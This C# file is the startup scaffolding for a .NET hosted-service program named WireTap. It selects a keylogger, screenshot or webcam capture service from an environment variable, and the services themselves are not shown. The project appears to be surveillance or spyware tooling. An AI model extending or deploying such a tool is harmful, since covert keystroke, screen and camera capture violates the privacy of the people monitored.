namespace WireTap.HostedService
{
    using Microsoft.Extensions.DependencyInjection;
    using Microsoft.Extensions.Hosting;
    using System;
    using System.Collections.Generic;
    using System.Threading.Tasks;

    public class Program
    {
        public static async Task Main(string[] args) =>
            await Host.CreateDefaultBuilder(args)
                      .ConfigureServices((hostContext, services) => services.ConfigureServices())
                      .Build()
                      .RunAsync();
    }

    public static class Startup
    {
        private static class ServiceRegistrar
        {
            public static Dictionary<string, Action<IServiceCollection>> ServiceRegistrations;

            static ServiceRegistrar()
            {
                ServiceRegistrations = new Dictionary<string, Action<IServiceCollection>>
                {
                    {  "keylogger", services => services.AddHostedService<KeyloggerService>()   },
                    { "screenshot", services => services.AddHostedService<ScreenshotService>()  },
                    {     "webcam", services => services.AddHostedService<WebcamService>()      }
                };
            }
        }

        public static IServiceCollection ConfigureServices(this IServiceCollection services)
        {
            services.AddHostedService();

            return services;
        }

        public static IServiceCollection AddHostedService(this IServiceCollection services)
        {
            var serviceName = Environment.GetEnvironmentVariable("SERVICE_NAME");
            var serviceRegistration = ServiceRegistrar.ServiceRegistrations[serviceName];
            serviceRegistration(services);

            return services;
        }
    }
}